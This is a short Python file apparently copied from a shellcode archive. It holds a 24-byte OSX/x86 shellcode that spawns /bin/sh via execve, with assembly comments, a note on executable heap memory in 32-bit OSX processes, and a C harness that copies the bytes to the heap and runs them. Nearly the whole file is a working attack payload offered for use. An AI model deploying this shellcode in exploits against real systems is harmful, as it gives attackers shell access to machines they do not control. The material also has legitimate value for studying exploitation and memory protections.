#http://shell-storm.org/shellcode/files/shellcode-692.php

"""
/*
Title : OSX/x86 intel - execve(/bin/sh) - 24 bytes
Type : Shellcode
Author : Simon Derouineau - simon.derouineau [AT] ingesup.com
Platform : Mac OSX/Intel. Tested on 10.6.4 Build 10F569

Informations : This code has to be compiled with gcc -m32 switch  on 10.6.0+

More informations : x86-64 code is more secured than x86 code on OSX platform :
Canaries are added, Stack and heap are non-executable, etc.

Also, cat /var/db/dyld/dyld_shared_cache_x86_64.map shows that no memory can be
mapped with WX flags, while it's possible with x86 code ( according to  /var/db/dyld/dyld_shared_cache_i386.map).

The method used here is the easier one, heap is executable in x86 applications,
as described in "The Mac Hacker's Handbook", written by Charlie Miller.

The trick is to memcopy the shellcode to the heap before executing it.

*/
"""


def bin_sh():
	shellcode =  r"\x31\xC0" 					#// xor eax,eax
	shellcode += r"\x50"						#// push eax
	shellcode += r"\x68\x2F\x2F\x73\x68"		#// push dword
	shellcode += r"\x68\x2F\x62\x69\x6E"		#// push dword
	shellcode += r"\x89\xE3"					#// mov ebx,esp
	shellcode += r"\x50\x50\x53"				#// push eax, push eax, push ebx
	shellcode += r"\xB0\x3B"					#// mov al,0x3b
	shellcode += r"\x6A\x2A"					#// push byte 0x2a
	shellcode += r"\xCD\x80"					#// int 0x80
	return shellcode

"""
int main(int argc, char *argv[]){
	void (*f)();
	char *x = malloc(sizeof(shellcode));
	memcpy(x, shellcode, sizeof(shellcode));
	f = (void (*)()) x;
	f();
}
"""



